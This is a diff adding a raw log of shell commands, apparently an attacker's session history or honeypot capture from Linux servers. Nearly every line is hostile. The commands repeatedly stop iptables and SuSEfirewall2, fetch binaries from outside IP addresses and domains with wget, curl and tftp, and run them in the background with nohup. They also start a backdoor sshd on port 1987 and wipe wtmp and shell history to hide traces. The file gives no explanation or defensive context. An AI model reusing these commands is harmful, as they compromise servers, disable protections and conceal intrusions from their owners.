@@ -1,0 +1,204 @@
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+chmod 777 /tmp/g251
+/tmp/g251
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://61.147.98.248:8080/ksmw;chmod 777 ksmw;./ksmw;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://61.147.98.248:8080/ksds;chmod 777 ksds;./ksds;
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+uname
+free -m
+ps x
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://45.116.79.140/grlg;chmod 777 grlg;./grlg;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://45.116.79.140/grlj;chmod 777 grlj;./grlj;
+service iptables stop
+wget http://115.231.218.31:888/333
+chmod 0755 /root/333
+nohup /root/333 > /dev/null 2>&1 &
+wget http://115.231.218.31:888/222
+chmod 0755 /root/222
+nohup /root/222 > /dev/null 2>&1 &
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+chmod 0755 /root/24Mm
+nohup /root/24Mm> /dev/null 2>&1 &
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1987
+service iptables stop
+cd /tmp
+wget http://mdb7.cn:8081/exp
+chmod 0777 /root/exp
+nohup /root/exp > /dev/null 2>&1 &
+rm -f /var/log/wtmp
+rm -rf exp
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+wget -c http://www.mhlsf3322.com:223/mhls
+chmod 777 ./mhls
+nohup ./mhls > /dev/null 2>&1 &
+export HISTFILE=/dev/null
+history -c
+rm -f /var/log/wtmp
+service iptables stop
+wget http://61.147.98.248:8080/grlg
+chmod 0755 /root/grlg
+nohup /root/grlg > /dev/null 2>&1 &
+chmod 777 grlg
+./grlg
+chmod 0755 /root/grlg
+nohup /root/grlg &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 grlg
+chmod u+x grlg
+./grlg &
+chmod u+x grlg
+./grlg &
+cd /tmp
+service iptables stop
+wget http://61.147.98.248:8080/grlj
+chmod 0755 /root/grlj
+nohup /root/grlj > /dev/null 2>&1 &
+chmod 777 grlj
+./164
+chmod 0755 /root/grlj
+nohup /root/grlj &gt; /dev/null 2&gt;&amp;1 &amp;
+chmod 0777 grlj
+chmod u+x grlj
+./grlj &
+chmod u+x dos6cc4
+./grlj &
+wget http://222.186.56.217:9987/K7
+wget http://222.186.56.217:9987/K7
+./K7 &
+id
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+echo "WinSCP: this is end-of-file:0"
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://45.116.79.140/grlg;chmod 777 grlg;./grlg;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://45.116.79.140/grlj;chmod 777 grlj;./grlj;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://45.116.79.140/grlj;chmod 777 grlj;./grlj;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://113.160.48.41:63/xxoo;chmod 777 xxoo;./xxoo;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;curl -c http://113.160.48.41:63/xxoo;wget http://113.160.48.41:63/xxoo;chmod 777 xxoo;./xxoo;
+wget http://123.249.12.12:8000/linux-arm
+rm -rf /var/run/sftp.pid;filename="/fuck";($filename) || (filename="/6000.bin";cd /;pwd;path=$filename;rm -f $path* || /dev/null > $path;for list in `echo http://51.255.84.218/ http://110.10.129.201/ `;do (wget -O $filename $list$filename || curl -o $filename $list$filename) && break;done ; if [ -f $path ];then chmod +x $path;$path && echo ExecOK;fi);sleep 3;uname -a;cat /etc/issue;df -h;ps -ef;netstat -anto;echo ExecOK;cat /var/run/sftp.pid && echo InstallOK;cat /var/run/mount.pid && echo InstallOK;cat /var/run/gcc.pid && echo InstallOK
+curl -o /tmp/linux http://23.234.25.140:15826/linux
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+chmod 0755 /root/TSmm
+nohup /TSmm> /dev/null 2>&1 &
+nohup /TSmm> /dev/null 2>&1 &
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+chmod 0755 /root/24Mm
+nohup /24Mm> /dev/null 2>&1 &
+id
+wget -O /tmp/zyd.m http://180.97.215.135:8080/zyd.m
+/etc/init.d/iptables stop
+chmod 0755 /tmp/zyd.m
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+nohup /root/zyd.m > /dev/null 2>&1 &
+uname -a
+whoami
+whoami
+/etc/init.d/iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+chmod 0755 /root/zyd.m
+nohup /root/zyd.m> /dev/null 2>&1 &
+nohup /root/zyd.m> /dev/null 2>&1 &
+service iptables stop
+wget -O /tmp/zyd.m http://180.97.215.135:8080/zyd.m
+reSuSEfirewall2 stop
+chmod 0755 /tmp/zyd.m
+nohup /tmp/zyd.m > /dev/null 2>&1 &
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+chmod 0755 /root/txma
+nohup /root/txma> /dev/null 2>&1 &
+id
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -O /tmp/syn1 http://69.12.77.199:92/roo1;chmod 0755 roo1;nohup /tmp/roo1 > /dev/null 2>&1 &;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn1;chmod 777 syn1;./syn1;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn1;chmod 777 syn1;./syn1;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/roo1;chmod 777 roo1;./roo1;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn1;chmod 777 syn1;./syn1;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/syn;chmod 777 syn;./syn;
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://69.12.77.199:92/roo1;chmod 777 roo1;./roo1;
+ifcongfig
+ifconfig
+curl -o /tmp/g251 http://23.234.25.140:15826/g251
+clear
+ls
+perl
+ls
+perl
+clear
+service iptables stop
+wget http://115.231.218.31:888/333
+nohup /root/333 > /dev/null 2>&1 &
+wget http://115.231.218.31:888/222
+nohup /root/222 > /dev/null 2>&1 &
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; wget http://199.180.134.199/bin.sh; sh bin.sh; rm -rf bin.sh; tftp -r tftp1.sh -g 199.180.134.199; sh tftp1.sh; tftp 199.180.134.199 -c get tftp2.sh; sh tftp2.sh; rm -rf bin.sh tftp1.sh tftp2.sh
+;s
+ls
+pwd
+wget http://123.1.169.48/aa
+ls
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+wget http://123.1.169.48/aa
+chmod 0755 aa
+nohup /root/aa > /dev/null 2>&1 &
+ls
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
+nohup /root/aa > /dev/null 2>&1 &
